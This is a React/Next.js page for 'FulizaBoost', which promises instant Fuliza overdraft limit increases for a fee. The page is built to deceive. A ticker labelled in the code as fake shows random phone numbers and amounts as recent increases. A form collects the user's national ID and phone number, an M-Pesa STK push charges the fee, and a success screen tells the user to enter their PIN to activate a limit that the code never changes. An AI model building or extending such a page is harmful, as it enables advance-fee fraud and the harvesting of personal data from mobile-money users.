'use client';

// src/app/page.tsx
import React from 'react';

function formatKsh(amount: number): string {
  return `Ksh ${amount.toLocaleString('en-KE')}`;
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateMaskedPhone(): string {
  const prefix = `07${randomInt(0, 4)}`;
  const suffix = `${randomInt(0, 9)}${randomInt(0, 9)}`;
  return `${prefix}${randomInt(0, 9)}****${suffix}`;
}

export default function FulizaBoostPage() {
  const limits = React.useMemo(
    () => [
      { amount: 5000, fee: 51 },
      { amount: 10000, fee: 159 },
      { amount: 19000, fee: 260 },
      { amount: 32000, fee: 620 },
      { amount: 44000, fee: 770 },
      { amount: 53000, fee: 990 },
      { amount: 62000, fee: 1139 },
      { amount: 75000, fee: 1800 },
    ],
    []
  );

  const [selectedAmount, setSelectedAmount] = React.useState(limits[0]?.amount ?? 0);
  const selectedOption = React.useMemo(
    () => limits.find((opt) => opt.amount === selectedAmount) ?? null,
    [limits, selectedAmount]
  );

  const [isModalOpen, setModalOpen] = React.useState(false);
  const [isSuccessOpen, setSuccessOpen] = React.useState(false); // New: success screen
  const [idNumber, setIdNumber] = React.useState('');
  const [phoneNumber, setPhoneNumber] = React.useState('');
  const [isLoading, setLoading] = React.useState(false);
  const [errorMsg, setErrorMsg] = React.useState<string | null>(null);

  const [recentIncrease, setRecentIncrease] = React.useState({
    phone: '07XX****XX',
    amount: 0,
  });

  React.useEffect(() => {
    setRecentIncrease({
      phone: generateMaskedPhone(),
      amount: limits[randomInt(0, limits.length - 1)]?.amount ?? 16400,
    });

    const interval = setInterval(() => {
      setRecentIncrease({
        phone: generateMaskedPhone(),
        amount: limits[randomInt(0, limits.length - 1)]?.amount ?? 16400,
      });
    }, 2000);

    return () => clearInterval(interval);
  }, [limits]);

  const fee = selectedOption?.fee ?? 0;
  const isValid = idNumber.trim().length > 3 && phoneNumber.replace(/\D/g, '').length >= 9;

  function handleCloseModal() {
    if (!isLoading) setModalOpen(false);
  }

  async function handleSubmit() {
    if (!selectedOption || !isValid || isLoading) return;

    setErrorMsg(null);
    setLoading(true);

    const cleanedPhone = phoneNumber.replace(/\D/g, '');
    const payload = {
      phone: cleanedPhone.startsWith('254')
        ? cleanedPhone
        : cleanedPhone.startsWith('0')
        ? `254${cleanedPhone.slice(1)}`
        : `254${cleanedPhone}`,
      amount: selectedOption.fee,
      apiRef: idNumber.trim() || `ref-${Date.now()}`,
    };

    console.log('Sending payload to API:', payload);

    try {
      const res = await fetch('/api/mock-stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      console.log('API response status:', res.status);

      const data = await res.json();

      if (!res.ok || !data?.ok) {
        throw new Error(data?.error || `Failed with status ${res.status}`);
      }

      // Success → close modal + show success screen
      setModalOpen(false);
      setSuccessOpen(true);

    } catch (err: any) {
      console.error('Fetch error:', err);
      setErrorMsg(err.message || 'An error occurred');
    } finally {
      setLoading(false);
    }
  }

  // Reset everything and return to main page
  function handleReturnToDashboard() {
    setSuccessOpen(false);
    setSelectedAmount(limits[0]?.amount ?? 0);
    setIdNumber('');
    setPhoneNumber('');
    setErrorMsg(null);
  }

  return (
    <>
      {/* Main Page + Modal */}
      {!isSuccessOpen && (
        <div className="min-h-screen bg-gradient-to-b from-[#e6fff2] to-[#f0fff5]">
          <main className="mx-auto flex w-full max-w-sm flex-col gap-3 px-4 pb-10 pt-4">
            {/* Header */}
            <header className="flex flex-col items-center gap-1">
              <div className="text-xl font-semibold tracking-tight text-[#0cc45f]">FulizaBoost</div>
              <div className="text-center text-[11px] text-slate-500">
                Instant Limit Increase - No Paperwork - Same Day Access
              </div>
            </header>

            {/* Info banner */}
            <section className="rounded-xl border border-[#0cc45f]/30 bg-white/70 px-4 py-3 shadow-sm backdrop-blur">
              <div className="flex items-start gap-2">
                <div className="mt-0.5 flex h-6 w-6 items-center justify-center rounded-full bg-[#0cc45f] text-white">
                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 5v14" />
                    <path d="M5 12h14" />
                  </svg>
                </div>
                <div className="text-center text-[12px] leading-4 text-slate-600">
                  Choose your new Fuliza limit and complete the payment to get instant access.
                </div>
              </div>
            </section>

            {/* Fake recent increases */}
            <section className="rounded-xl bg-gradient-to-r from-[#e6fff2] to-[#f0fff5] px-4 py-3 shadow-sm ring-1 ring-slate-200">
              <div className="flex items-center gap-2 text-[12px] text-slate-700">
                <div className="flex h-6 w-6 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M4 12h10" />
                    <path d="M10 6l6 6-6 6" />
                  </svg>
                </div>
                <div className="flex-1">
                  <span className="font-semibold text-[#0cc45f]">Recent increases</span>
                  <div className="text-[11px] text-slate-600">
                    {recentIncrease.phone} increased to {formatKsh(recentIncrease.amount)} - just now
                  </div>
                </div>
              </div>
            </section>

            {/* Limit selection */}
            <section className="rounded-2xl bg-white shadow-sm ring-1 ring-slate-200">
              <div className="border-t-4 border-[#0cc45f] px-4 pb-4 pt-4">
                <div className="flex items-center gap-2">
                  <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-[#0cc45f]/10 text-[#0cc45f]">
                    <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M4 7h16" />
                      <path d="M4 17h16" />
                      <path d="M7 11h10" />
                    </svg>
                  </div>
                  <div className="text-sm font-semibold text-[#0cc45f]">Select Your Fuliza Limit</div>
                </div>

                <div className="mt-4 grid grid-cols-2 gap-3">
                  {limits.map((opt) => {
                    const isSelected = opt.amount === selectedAmount;
                    return (
                      <button
                        key={opt.amount}
                        type="button"
                        onClick={() => {
                          setSelectedAmount(opt.amount);
                          setModalOpen(true);
                          setErrorMsg(null);
                        }}
                        className={`rounded-xl border px-3 py-3 text-left shadow-sm transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 cursor-pointer ${
                          isSelected
                            ? 'border-[#0cc45f] ring-2 ring-[#0cc45f]/30 bg-[#0cc45f]/10 scale-105'
                            : 'border-slate-200 hover:border-[#0cc45f]/50 hover:bg-[#0cc45f]/5 hover:scale-102'
                        }`}
                      >
                        <div className="text-xs font-semibold text-[#0cc45f]">{formatKsh(opt.amount)}</div>
                        <div className="mt-1 inline-flex rounded-full bg-slate-100 px-2 py-0.5 text-[10px] text-slate-600">
                          Fee: Ksh {opt.fee.toLocaleString('en-KE')}
                        </div>
                      </button>
                    );
                  })}
                </div>

                {selectedOption && (
                  <div className="mt-3 text-center text-[11px] text-slate-500">
                    Selected: {formatKsh(selectedOption.amount)} • Fee: Ksh {selectedOption.fee.toLocaleString('en-KE')}
                  </div>
                )}
              </div>
            </section>

            {/* Badges */}
            <section className="grid grid-cols-2 gap-3 pt-1">
              <div className="flex items-center justify-center gap-2 rounded-full bg-white/70 px-3 py-2 text-[11px] text-slate-600 shadow-sm ring-1 ring-slate-200">
                <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-[#0cc45f]/10 text-[#0cc45f]">
                  <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z" />
                  </svg>
                </span>
                Secure
              </div>

              {/* ... other badges remain the same ... */}
            </section>

            {/* Payment Details Modal */}
            {isModalOpen && (
              <div className="fixed inset-0 z-50 flex items-end justify-center px-4 pb-6 pt-10 sm:items-center sm:pb-10">
                <button
                  type="button"
                  aria-label="Close"
                  onClick={handleCloseModal}
                  className="absolute inset-0 bg-slate-900/40 backdrop-blur-sm"
                />

                <div className="relative w-full max-w-sm rounded-2xl bg-white p-5 shadow-xl ring-1 ring-slate-200">
                  <div className="flex flex-col items-center">
                    <div className="flex h-16 w-16 items-center justify-center rounded-full border-4 border-[#0cc45f]/30 text-[#0cc45f]">
                      <svg viewBox="0 0 24 24" className="h-8 w-8" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M12 18h.01" />
                        <path d="M12 14a4 4 0 10-4-4" />
                        <path d="M12 10V6" />
                      </svg>
                    </div>

                    <div className="mt-3 text-lg font-semibold text-[#0cc45f]">Enter Your Details</div>

                    <div className="mt-2 flex items-center gap-2 text-sm text-slate-600">
                      <svg viewBox="0 0 24 24" className="h-4 w-4 text-slate-500" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
                        <circle cx="12" cy="7" r="4" />
                      </svg>
                      Provide your details to proceed
                    </div>
                  </div>

                  <div className="mt-5">
                    {/* ID Number */}
                    <div className="mb-1 flex items-center gap-2 text-sm font-semibold text-[#0cc45f]">
                      <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M4 7h16" />
                        <path d="M4 17h16" />
                        <path d="M7 11h10" />
                      </svg>
                      ID Number
                    </div>
                    <input
                      value={idNumber}
                      onChange={(e) => setIdNumber(e.target.value)}
                      placeholder="Enter your ID number"
                      inputMode="numeric"
                      className="w-full rounded-xl border border-slate-200 px-4 py-3 text-sm text-slate-800 shadow-sm outline-none focus:border-[#0cc45f] focus:ring-2 focus:ring-[#0cc45f]/20"
                    />

                    {/* Phone Number */}
                    <div className="mt-4">
                      <div className="mb-1 flex items-center gap-2 text-sm font-semibold text-[#0cc45f]">
                        <svg viewBox="0 0 24 24" className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth="2">
                          <path d="M7 4h10v16H7z" />
                          <path d="M11 5h2" />
                          <path d="M12 17h.01" />
                        </svg>
                        Phone Number
                      </div>
                      <div className="flex overflow-hidden rounded-xl border border-slate-200 shadow-sm focus-within:border-[#0cc45f] focus-within:ring-2 focus-within:ring-[#0cc45f]/20">
                        <div className="flex items-center justify-center bg-slate-50 px-4 text-sm font-semibold text-slate-700">
                          +254
                        </div>
                        <input
                          value={phoneNumber}
                          onChange={(e) => setPhoneNumber(e.target.value)}
                          placeholder="712 345 678"
                          inputMode="numeric"
                          className="min-w-0 flex-1 px-4 py-3 text-sm text-slate-800 outline-none"
                        />
                      </div>
                    </div>

                    {/* Payment info */}
                    <div className="mt-4 rounded-xl bg-slate-50 px-4 py-3 text-sm text-slate-600">
                      <div className="flex items-start gap-2">
                        <svg viewBox="0 0 24 24" className="mt-0.5 h-4 w-4 text-slate-500" fill="none" stroke="currentColor" strokeWidth="2">
                          <circle cx="12" cy="12" r="10" />
                          <path d="M12 16v-4" />
                          <path d="M12 8h.01" />
                        </svg>
                        <div>
                          We'll send an M-Pesa STK push to your phone number for payment
                          {fee ? ` (Fee: Ksh ${fee.toLocaleString('en-KE')})` : ''}.
                        </div>
                      </div>
                    </div>

                    {errorMsg && (
                      <div className="mt-4 rounded-xl bg-rose-50 px-4 py-3 text-sm text-rose-700 ring-1 ring-rose-200">
                        {errorMsg}
                      </div>
                    )}

                    <button
                      type="button"
                      onClick={handleSubmit}
                      disabled={!isValid || isLoading}
                      className={`mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold text-white shadow-sm transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 ${
                        !isValid || isLoading ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#0cc45f] hover:bg-[#0bb04f]'
                      }`}
                    >
                      {isLoading ? 'Processing...' : 'Continue'}
                    </button>

                    <button
                      type="button"
                      onClick={handleCloseModal}
                      disabled={isLoading}
                      className={`mt-3 w-full rounded-xl border px-4 py-3 text-sm font-semibold shadow-sm transition-colors ${
                        isLoading ? 'cursor-not-allowed border-slate-200 bg-white text-slate-400' : 'border-slate-200 bg-white text-slate-700 hover:bg-slate-50'
                      }`}
                    >
                      Cancel
                    </button>
                  </div>
                </div>
              </div>
            )}
          </main>
        </div>
      )}

      {/* Success Screen */}
      {isSuccessOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-gradient-to-b from-[#e6fff2] to-[#f0fff5] px-4">
          <div className="w-full max-w-sm rounded-2xl bg-white p-8 shadow-2xl ring-1 ring-slate-200 text-center">
            <h1 className="text-4xl font-bold text-[#0cc45f] mb-2">Success!</h1>
            <p className="text-lg font-semibold text-gray-800 mb-6">
              Your boost of {formatKsh(selectedAmount)} has been successfully processed.
            </p>

            <div className="bg-[#e6fff2] rounded-xl p-6 mb-8 border border-[#0cc45f]/30">
              <div className="flex items-center justify-center gap-3 mb-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#0cc45f] text-white text-xl font-bold">
                  i
                </div>
                <p className="text-[#0cc45f] font-medium">Final Step</p>
              </div>
              <p className="text-gray-700 leading-relaxed">
                Enter your M-Pesa PIN on the prompt showing on your phone currently to activate your new limit.
              </p>
            </div>

            <button
              onClick={handleReturnToDashboard}
              className="w-full rounded-xl bg-[#0cc45f] px-6 py-4 text-lg font-semibold text-white shadow-lg hover:bg-[#0bb04f] transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40"
            >
              Return to Dashboard
            </button>
          </div>
        </div>
      )}
    </>
  );
}